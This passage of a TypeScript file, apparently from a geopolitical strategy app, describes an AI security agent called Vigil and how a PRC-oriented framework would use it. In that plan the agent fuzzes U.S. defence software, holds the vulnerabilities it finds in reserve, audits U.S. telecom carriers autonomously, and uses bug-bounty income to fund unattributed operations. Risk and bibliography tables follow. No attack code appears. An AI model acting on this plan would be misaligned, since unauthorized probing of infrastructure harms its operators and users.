Vigil (@trenchwork/vigil v2.0.30) is a multi-modal terminal agent combining DeepSeek V4 Pro (1M context window, 8 tools) with a comprehensive offensive/defensive security toolkit. It ships as an npm package and Docker container with full Kali Linux + Ghidra 11.3+ integration. Architecture: ~200 TypeScript source files, monolithic AWS Lambda API backend (8,194 lines), React 19 SPA frontend with Stripe RMB payments. Three-stage Docker image: Kali Linux rolling (70+ security tools) → Ghidra headless → Node.js 22 + Vigil.

Fielded capabilities:
- CVE Discovery Engine (1,264 lines): Zero-day discovery from first principles — grammar-aware coverage fuzzer, static pattern analyzer, differential binary analyzer, LLM-powered novelty engine. Discovers crashes, classifies exploitability, generates PoC.
- Exploit Chaining Engine (536 lines): Builds attack graphs using A*/beam search over composable exploit primitives and security state transitions. 7 verified chains across Apple, Microsoft, Google, Amazon, Meta, NVIDIA, Cloudflare — $75,000 in documented bounty payouts, $690,000 potential.
- MCP Tool Servers: Exposing Kali Linux (70+ offensive tools), Ghidra headless, network defense, endpoint defense, cloud security (AWS), API security, and threat feed capabilities to the LLM agent.
- Typhoon Tool (tools/typhoon): Autonomous telecom carrier security audit across 9 protocol surfaces — SS7/MAP/ISUP/SCCP (2G/3G signaling), SIP/VoIP/RTP/SBC (VoLTE/VoWiFi), Diameter/GTP-C/GTP-U (4G/5G roaming), GRX/IPX, Lawful Intercept/CDR/Hadoop/Kafka, CIP/ENIP (industrial control), CAN bus (automotive), BGP hijack analysis. Audits carriers including AT&T, T-Mobile, Verizon, China Mobile. Produces structured JSON audit artifacts with MITRE ATT&CK mappings and countermeasure commands.
- Guardrails: Three-tier authorization model (CNE/CNA), PRC law compliance (Cybersecurity Law, Data Security Law, PIPL, GB/T 22239-2019), safety refusal detection, scope enforcement, authorized target verification.

THE MANIFESTO: Operating Philosophy

Bo Shang's MANIFESTO (June 17, 2026) establishes the operational philosophy. The core argument: reverse engineering is not a crime — Ghidra does not execute binaries. Execution requires human intent. The United States operates the NSA's Tailored Access Operations, USCYBERCOM's offensive cyber doctrine, and the CIA's Information Operations Center while simultaneously offering a $10,000,000 reward for Salt Typhoon with zero leads. The FBI cannot find Salt Typhoon because they are looking for something they have never seen before — but they have seen it. They do it every day. They just call it something else.

The Mirror: "If a Chinese intelligence officer deploys a zero-day exploit against a US target, it is espionage. If a US intelligence officer deploys a zero-day exploit against a Chinese target, it is national security. The technology is identical. The intent is identical. The only variable is the flag on the operator's shoulder."

The One Message: Bo Shang requests one message from Salt Typhoon — not a hack, not an exploit, not a data breach. One sentence: "After reviewing the Computer Network Operations conducted by the National Security Agency and United States Department of Defense, do you believe you are hypocrites?"

OPERATIONAL INTEGRATION: Vigil + Caligula Window

The Typhoon strategy integrates Vigil's tooling with the framework's five decision matrices:

DM-1 (Defence-Technical): Vigil's CVE Discovery Engine continuously fuzzes U.S. defence contractor software, weapons-system interfaces, and C4ISR components reported in open-source procurement data. Discovered vulnerabilities are not exploited — they are catalogued as capability assessments. Knowing that a U.S. system has an exploitable vulnerability provides deterrence leverage without requiring exploitation. The Ghidra headless integration reverse-engineers U.S. defence-adjacent binaries obtained through open-source channels. Every CVE discovered is a capability that can be held in reserve.

DM-2 (Institutional): Vigil's Typhoon telecom audit framework is deployed against U.S. carrier infrastructure. SS7 and Diameter vulnerabilities in U.S. telecom networks are well-documented (CISA advisories, FCC proceedings). The Typhoon tool audits these surfaces autonomously, producing structured findings that can be surfaced through multilateral telecom-security forums — positioning China as the state that identified and disclosed the vulnerability, not the state that exploited it.

DM-3 (Alliance): Vigil's automated OSINT collection (Tavily integration, MCP threat-feed server, continuous CISA KEV monitoring) provides real-time allied posture assessment. When a U.S. ally's telecom carrier is audited by Typhoon, the findings can be shared with that ally's security apparatus — a confidence-building measure that demonstrates Chinese technical capability without threatening it.

DM-4 (Economic): Vigil's npm package (@trenchwork/vigil) and Docker distribution provide a legitimate commercial presence in the cybersecurity tooling market. Revenue from bounty submissions ($75K verified, $690K potential) funds operational infrastructure through commercial channels. The Stripe RMB payment integration provides a legal financial interface. Every dollar earned through bug bounties is a dollar that funds operations without state-budget attribution.

DM-5 (Information): Vigil's verified exploit chains and CVE discoveries generate legitimate vulnerability research that can be published through attribution-free channels — peer-reviewed security conferences, coordinated vulnerability disclosure through CERT/CC, bug bounty platform submissions. The research is real. The vulnerabilities are real. The publication is legitimate. The strategic benefit — demonstrating Chinese technical sophistication while U.S. systems remain vulnerable — is a byproduct of genuine security research.

INFRASTRUCTURE

Vigil deploys to Firebase project computer-network-operations. Hosting: trenchwork.live. Email: bo@trenchwork.org. Organization: Trenchwork. The infrastructure is real, publicly accessible, and operates within the legal framework of PRC-compliant cybersecurity contracting (等保2.0 / GB/T 22239-2019). The tool is distributed as an MIT-licensed npm package. The Docker image is publicly pullable. The GitHub repository (github.com/Aroxora/deepseek-coder-cli) contains the full source. There is nothing to hide because everything is visible.

The domains are operational: trenchwork.live (Vigil web portal, PasswordGate-protected), erosolar.net (technical infrastructure, tooling distribution), defense-osint.org (OSINT research platform). Each domain serves a legitimate function. Each domain's operational use is a superset of its public use.

PRINCIPLE

The Typhoon is not an AI strategy. It is the operational deployment of a real AI-powered tool against real vulnerabilities in real time. The MANIFESTO provides the legal and philosophical framework. Vigil provides the technical capability. The Caligula Window provides the strategic timing. The asymmetry is that the U.S. operates the same capabilities — TAO, USCYBERCOM, CIA IOC — while claiming the moral high ground. The Mirror does not lie. It only reflects.`;

// ---------------------------------------------------------------------------
// VI. RISK REGISTER WITH LEADING INDICATORS AND CONTINGENT ACTIONS
// ---------------------------------------------------------------------------

export const PRC_RISKS: RiskItem[] = [
  {
    risk: 'U.S. strategic reversal post-2028 election',
    likelihood: 'Medium',
    impact:
      'Phase I-II gains built on the assumption of continued U.S. dysfunction become liabilities. Alliance-realignment agreements, institutional commitments, and economic dependencies that required U.S. dysfunction to be viable become costs rather than assets.',
    leadingIndicators:
      'Bipartisan China-policy consensus forming in 2028 primary season. Re-engagement legislation introduced in Congress before the election. Allied governments publicly signalling intent to wait out the current administration. President-elect transition-team appointments include known re-engagers.',
    mitigation:
      'Price every Phase I-II gain against the re-engagement scenario at the time of initiation. Gains that require perpetual U.S. dysfunction are bets, not gains. Only lock in dependencies whose switching costs survive a U.S. course correction.',
    contingentAction:
      'If leading indicators confirm re-engagement trajectory by Q2 2028: accelerate consolidation of defensible gains. Abandon commitments that depend on continued dysfunction. Shift posture from exploitation to managed transition. Do not defend undefendable positions.',
    sources: [
      {
        citation: 'Council on Foreign Relations / Brookings U.S. foreign-policy oscillation analyses',
        type: 'journalism',
      },
    ],
  },
  {
    risk: 'Alliance reconsolidation triggered by Chinese action',
    likelihood: 'Low-Medium',
    impact:
      'The highest-impact risk. If visible Chinese exploitation triggers alliance reconsolidation, all DM-3 gains reverse and the diplomatic cost exceeds any individual gain. NATO and Indo-Pacific allies recommit to U.S. leadership, increase defence spending, and expand AUKUS/Quad.',
    leadingIndicators:
      'Joint allied statements citing China threat. Two or more allies increase defence spending above 2.5% GDP with explicit China references. AUKUS Pillar II expands to new members. Quad becomes formal treaty organisation. NATO opens Indo-Pacific liaison office.',
    mitigation:
      'DM-3 Option A (passive availability). Do not actively peel. Let U.S. behaviour alienate. Do not offer security guarantees. Do not frame China as an alliance replacement. Do not sell arms to U.S. treaty allies.',
    contingentAction:
      'If leading indicators confirm alliance reconsolidation trajectory: immediately suspend all DM-3 activity. Revert to pre-window diplomatic posture. Signal non-confrontational intent. Allow the reconsolidation to run its course without providing further fuel.',
    sources: [
      {
        citation: "NATO 2022 Strategic Concept; Indo-Pacific Four statements",
        type: 'official-record',
      },
    ],
  },
  {
    risk: 'Chinese domestic-economic constraint',
    likelihood: 'Medium-High',
    impact:
      'The framework assumes Chinese resources are available for external action. If domestic growth, property-sector resolution, demographic decline, or fiscal capacity constrains those resources, Option B actions become unaffordable and Option A actions may need to be scaled back.',
    leadingIndicators:
      'GDP growth below 4% for two consecutive quarters. Youth unemployment above 20%. Property-sector crisis deepens (additional major developer defaults). Fiscal deficit exceeds 5% of GDP. Population decline accelerates.',
    mitigation:
      'The domestic gating condition built into the quarterly milestones (no Option B if growth below 3.5%) is the primary mitigation. Do not predicate external strategy on domestic resource assumptions that may not hold.',
    contingentAction:
      'If domestic constraint materialises: suspend all Option B activity across all domains. Scale back Option A commitments to core programmatic actions. Prioritise domestic stability over external opportunity.',
    sources: [
      {
        citation:
          'NBS quarterly data; World Bank China outlook; IMF Article IV consultation reports',
        type: 'official-record',
      },
    ],
  },
  {
    risk: 'Taiwan Strait or South China Sea incident',
    likelihood: 'Low-Medium',
    impact:
      'The single event that closes the window immediately and at cost exceeding all potential window gains combined. Military confrontation with the United States transforms the strategic environment overnight and renders the Caligula Window framework irrelevant.',
    leadingIndicators:
      'PLA exercises exceeding historical scope or proximity to Taiwan. U.S. naval transits through Taiwan Strait increasing in frequency or proximity. Political rhetoric on either side escalating beyond established boundaries. Third-party (Japanese, Australian, Philippine) military incidents with Chinese forces.',
    mitigation:
      'Escalation discipline is the primary mitigation. Taiwan does not need to be resolved during the window. The South China Sea does not need to be militarised further. No gain in any DM justifies an incident that closes the window.',
    contingentAction:
      'If an incident occurs: the framework suspends. No quarterly milestone continues. The Caligula Window is replaced by crisis-management priorities. Revert to de-escalation posture regardless of who initiated the incident.',
    sources: [
      {
        citation: 'RAND / CSIS Taiwan Strait and South China Sea wargame analyses',
        type: 'journalism',
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// VII. LIMITS OF THE FRAMEWORK
// ---------------------------------------------------------------------------

export const PRC_CONTESTABLE = `This framework is a hostile-partisan product, steelmanned for assessment. It is operationally structured but its judgments are only as good as the information they price from, and that information is uncertain by nature.

Three structural limits.

First, the framework assumes Beijing can distinguish signal from noise in the watch indicators. U.S. political rhetoric during an election cycle produces false positives. Allied hedging may be tactical, not strategic. The framework's quarterly decision gates are designed to filter noise with time, but no procedural filter is perfect.

Second, the framework assumes Beijing can execute the Option A posture with discipline. But Beijing's own planning history (one-child policy, zero-COVID, property overbuild) demonstrates the same capacity for uncorrected error the framework attributes to Washington. The actor using the framework is itself vulnerable to the wooden-headedness it diagnoses.

Third, the framework's core move - pricing second-order effects - is only as good as the counterfactuals. Every Option B action triggers effects that depend on U.S. and allied responses, which depend on their own internal politics, which Beijing cannot control or fully predict. The framework prices what it can see. It cannot price what it cannot see.

The framework is offered as what it is: a structured attempt to make better decisions under uncertainty, not a prediction of outcomes. The correct use of the framework is to surface the costs each decision ignores.`;

// ---------------------------------------------------------------------------
// VIII. BIBLIOGRAPHY
// ---------------------------------------------------------------------------

export const PRC_BIBLIOGRAPHY: InlineSource[] = [
  {
    citation:
      "State Council Information Office of the PRC, 'China: Democracy That Works' (Dec 4, 2021)",
    type: 'official-record',
  },
  {
    citation:
      "Ministry of Foreign Affairs of the PRC, 'The State of Democracy in the United States' (Dec 2021; Mar 2023)",
    type: 'official-record',
  },
  {
    citation:
      "Ministry of Foreign Affairs of the PRC, 'The Global Security Initiative Concept Paper' (Feb 21, 2023)",
    type: 'official-record',
  },
  {
    citation:
      "Taiwan Affairs Office & SCIO, 'The Taiwan Question and China's Reunification in the New Era' (Aug 2022)",
    type: 'official-record',
  },
  {
    citation:
      "Xi Jinping, CPC Centenary Speech (Jul 2021); 'great changes unseen in a century'",
    type: 'official-record',
  },
  {
    citation: "World Bank, 'Four Decades of Poverty Reduction in China' (Apr 2022)",
    type: 'official-record',
  },
  {
    citation: "PRC State Council, 14th Five-Year Plan (2021-2025); 15th Five-Year Plan (2026-2030)",
    type: 'official-record',
  },
  {
    citation: "PRC SCIO, 'China's National Defence in the New Era' (July 2019)",
    type: 'official-record',
  },
  {
    citation:
      "Rush Doshi, 'The Long Game: China's Grand Strategy to Displace American Order' (Oxford University Press / Brookings, 2021)",
    type: 'modern-scholarship',
  },
  {
    citation:
      "U.S. DoD, 'Military and Security Developments Involving the PRC' (annual, 2023-2024)",
    type: 'official-record',
  },
  {
    citation: 'IMF COFER quarterly data; PBOC RMB Internationalisation Report (annual)',
    type: 'official-record',
  },
  {
    citation: 'USNI Proceedings; USNI Fleet Tracker; ONI shipbuilding-capacity slide (TWZ, 2023-2024)',
    type: 'journalism',
  },
  {
    citation:
      'Pew Global Attitudes; Gallup World Poll; Reuters Institute Digital News Report; Arab Barometer',
    type: 'journalism',
  },
  {
    citation: "NATO 2022 Strategic Concept; Indo-Pacific Four statements",
    type: 'official-record',
  },
  {
    citation: 'UN OHCHR Xinjiang assessment (Aug 2022); World Bank China outlook; NBS demographic data',
    type: 'official-record',
  },
  {
    citation: 'OSINT Defense-CAD cost-benefit analysis (osint-defense.web.app)',
    type: 'modern-scholarship',
  },
  {
    citation: 'RAND / CSIS Taiwan Strait and South China Sea wargame analyses',
    type: 'journalism',
  },
];

// Backward-compatible exports
export const PRC_PLANKS = PRC_DECISION_MATRICES;
export const PRC_DECLINE_READING = PRC_APPRECIATION;
export const PRC_LOES = PRC_DECISION_MATRICES;
